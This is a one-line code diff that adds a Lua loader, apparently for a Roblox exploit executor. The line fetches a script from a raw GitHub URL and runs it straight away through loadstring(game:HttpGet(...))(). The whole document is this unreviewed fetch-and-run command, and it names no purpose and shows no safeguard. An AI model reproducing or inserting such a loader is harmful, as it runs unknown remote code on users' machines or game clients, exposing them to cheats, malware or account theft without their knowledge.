@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/interrogation-special-cases-spam2-0u5q0js3mctcyq.lua"))()
